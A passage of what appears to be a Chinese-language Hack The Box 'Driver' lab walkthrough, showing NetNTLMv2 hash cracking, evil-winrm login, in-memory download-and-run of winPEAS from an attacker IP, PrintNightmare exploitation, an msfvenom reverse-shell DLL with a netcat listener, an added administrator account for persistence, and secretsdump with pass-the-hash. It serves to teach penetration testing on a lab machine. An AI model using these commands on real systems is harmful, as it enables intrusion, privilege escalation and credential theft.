+</span></span></code></pre></div><p><code>--pot</code>参数指定pot文件的名字，这样面对同一个文件的爆破，不同pot名称即可实现对同一个文件多次爆破</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john --format<span class="o">=</span>netntlmv2 digest --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt --pot<span class="o">=</span>driver.pot
+</span></span><span class="line"><span class="cl">liltony          <span class="o">(</span>tony<span class="o">)</span>
+</span></span></code></pre></div>
+<h4 class="relative group">登录winrm 
+    <div id="登录winrm" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e7%99%bb%e5%bd%95winrm" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i 10.10.11.106 -u tony -p liltony -P <span class="m">5985</span>
+</span></span></code></pre></div>
+<h5 class="relative group">user flag 
+    <div id="user-flag" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#user-flag" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p>查找user.txt</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span> <span class="n">-Filter</span> <span class="n">user</span><span class="p">.</span><span class="py">txt</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span></span></code></pre></div><p>或者使用简写: <code>gci -r -file c:\users</code>，或者使用type也可以</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">type </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">tony</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">user</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></div>
+<h4 class="relative group">提权 
+    <div id="提权" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%8f%90%e6%9d%83" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+
+<h5 class="relative group">winpeas枚举 
+    <div id="winpeas枚举" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#winpeas%e6%9e%9a%e4%b8%be" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p>设置运行脚本执行，无文件执行<a
+  href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe"
+    target="_blank"
+  >winpeas</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">set-executionpolicy</span> <span class="n">unrestricted</span> <span class="n">-scope</span> <span class="n">currentuser</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$wp</span><span class="p">=[</span><span class="no">System.Reflection.Assembly</span><span class="p">]::</span><span class="n">Load</span><span class="p">([</span><span class="no">byte[]</span><span class="p">](</span><span class="nb">Invoke-WebRequest</span> <span class="s2">&#34;http://10.10.14.14/winPEASx64.exe&#34;</span> <span class="n">-UseBasicParsing</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">Content</span><span class="p">));</span> <span class="p">[</span><span class="no">winPEAS.Program</span><span class="p">]::</span><span class="n">Main</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>-UseBasicParsing: 如果没有装IE浏览器,使用基本解析方式可以保证下载执行,或者浏览器初始化过程没有操作过,使用这个参数规避掉这个问题</p>
+<p>这里没成功执行提权程序，那么下载文件到本地再执行</p>
+<p>可以通过certutil.exe或者evil-winrm来下载文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">certutil</span><span class="p">.</span><span class="py">exe</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">14</span><span class="p">/</span><span class="n">winPEASx64</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="c"># 通过evil-winrm来传递文件</span>
+</span></span><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">winPEASx64</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><p>执行自动枚举脚本并将结果返回到kali</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">winPEASx64</span><span class="p">.</span><span class="py">exe</span> <span class="n">log</span>
+</span></span></code></pre></div><p>指定log参数，默认将结果输出文件名为out.txt, 通过evil-winrm将文件下载回kali分析</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">download</span> <span class="n">out</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cat </span><span class="n">out</span><span class="p">.</span><span class="py">txt</span> <span class="p">|</span> <span class="n">less</span> <span class="n">-R</span> 
+</span></span><span class="line"><span class="cl"><span class="n">batcat</span> <span class="n">out</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS history </span><span class="n">file</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">tony</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadLine</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Add-Printer</span> <span class="n">-PrinterName</span> <span class="s2">&#34;RICOH_PCL6&#34;</span> <span class="n">-DriverName</span> <span class="s1">&#39;RICOH PCL6 UniversalDriver V4.23&#39;</span> <span class="n">-PortName</span> <span class="s1">&#39;lpt1:&#39;</span>
+</span></span></code></pre></div><p>一条添加打印机的命令，接口是并行端口，名为<code>lpt1</code>,在后续列出的进程当中能看到spoolsv这个打印机的进程</p>
+
+<h5 class="relative group">printnightmare提权 
+    <div id="printnightmare提权" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#printnightmare%e6%8f%90%e6%9d%83" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p>spoolsv是windows用来管理打印机任务的进程，是打印后台处理程序的核心进程，duckduckgo搜索一下<code>windows spoolsv exploit</code>, 能看到一个高频出现的漏洞<code>printnightmare</code>, 可以使用nxc查看一下这台靶机是否可以利用<code>printnightmare</code></p>
+<p>关于<code>printnightmare</code>的更多细节可以查看这篇<a
+  href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html"
+    target="_blank"
+  >博客</a></p>
+
+<h6 class="relative group">nxc模块检测printnightmare可用性 
+    <div id="nxc模块检测printnightmare可用性" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#nxc%e6%a8%a1%e5%9d%97%e6%a3%80%e6%b5%8bprintnightmare%e5%8f%af%e7%94%a8%e6%80%a7" aria-label="Anchor">#</a>
+    </span>        
+    
+</h6>
+<p>可以使用nxc的模块检测一下是不是可以进行printnightmare提权</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ nxc smb driver.htb -u tony -p liltony -M printnightmare
+</span></span><span class="line"><span class="cl">SMB         10.10.11.106    <span class="m">445</span>    DRIVER           <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> Build <span class="m">10240</span> x64 <span class="o">(</span>name:DRIVER<span class="o">)</span> <span class="o">(</span>domain:DRIVER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span> 
+</span></span><span class="line"><span class="cl">SMB         10.10.11.106    <span class="m">445</span>    DRIVER           <span class="o">[</span>+<span class="o">]</span> DRIVER<span class="se">\t</span>ony:liltony 
+</span></span><span class="line"><span class="cl">PRINTNIG... 10.10.11.106    <span class="m">445</span>    DRIVER           Vulnerable, next step https://github.com/ly4k/PrintNightmare
+</span></span></code></pre></div>
+<h6 class="relative group">Exploit 
+    <div id="exploit" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#exploit" aria-label="Anchor">#</a>
+    </span>        
+    
+</h6>
+<p>我这里直接使用JohnHammond所编写的利用<a
+  href="https://github.com/calebstewart/CVE-2021-1675/commits?author=JohnHammond"
+    target="_blank"
+  >脚本</a>，当然也可以通过自定义dll文件来实现其他的利用方式</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/refs/heads/main/CVE-2021-1675.ps1
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">CVE</span><span class="p">-</span><span class="mf">2021</span><span class="p">-</span><span class="mf">1675</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">cve</span><span class="p">-</span><span class="mf">2021</span><span class="p">-</span><span class="mf">1675</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-Nightmare</span> <span class="n">-NewUser</span> <span class="s2">&#34;printer&#34;</span> <span class="n">-NewPassword</span> <span class="s2">&#34;Pass@word!&#34;</span>
+</span></span></code></pre></div><p>这里创建用户后是administrator用户，但是使用evil-winrm登录时候无法登录，可能是限制了administrator权限的用户通过winrm远程登录，这样的话可以自定义一个反弹shell的dll文件，通过printnightmare允许这个dll文件</p>
+
+<h5 class="relative group">msfvenom生成dll 
+    <div id="msfvenom生成dll" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#msfvenom%e7%94%9f%e6%88%90dll" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/x64/powershell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.14 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f dll -o reverse.dll
+</span></span><span class="line"><span class="cl">sudo rlwrap -Ac nc -lvnp <span class="m">443</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">reverse</span><span class="p">.</span><span class="py">dll</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">cve</span><span class="p">-</span><span class="mf">2021</span><span class="p">-</span><span class="mf">1675</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-Nightmare</span> <span class="n">-DLL</span> <span class="s2">&#34;C:\programdata\apps\reverse.dll&#34;</span>
+</span></span></code></pre></div><p>执行之后拿下system32权限</p>
+
+<h4 class="relative group">root.txt 
+    <div id="roottxt" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#roottxt" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">type</span> C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
+</span></span></code></pre></div>
+<h4 class="relative group">持久化 
+    <div id="持久化" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%8c%81%e4%b9%85%e5%8c%96" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>通过net user建立一个administrator组的用户，来实现持久化权限（这种方式实战中不推荐使用，很容易被查到）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">user</span> <span class="n">drive</span> <span class="n">Pass</span><span class="nv">@word</span><span class="p">!</span> <span class="p">/</span><span class="n">add</span>
+</span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span> <span class="n">drive</span> <span class="p">/</span><span class="n">add</span>
+</span></span></code></pre></div>
+<h5 class="relative group">使用impacket工具包dump hash 
+    <div id="使用impacket工具包dump-hash" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e4%bd%bf%e7%94%a8impacket%e5%b7%a5%e5%85%b7%e5%8c%85dump-hash" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo impacket-secretsdump <span class="s1">&#39;drive:Pass@word!&#39;</span>@driver.htb
+</span></span><span class="line"><span class="cl"><span class="c1"># 用户名:RID:LM哈希:NT哈希:::</span>
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::
+</span></span></code></pre></div><p>通过secretdump脚本拿到了administrator用户的NTLM哈希，可以通过这个哈希来登录administrator用户(Pass-the-hash)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nxc winrm driver.htb -u Administrator -H d1256cff8b5b5fdb8c327d3b6c3f5017
+</span></span></code></pre></div>
+          
+          
+          
+        </div>
+
+        
+
+        
+
+        
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_posts\HTB-Driver\index.md"
+          data-oid-likes="likes_posts\HTB-Driver\index.md"></script>
+      
+
+    </section>
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+
+
+      
+    </footer>
+  </article>
+
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2025
+          
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script> 
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="https://ink410.github.io/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
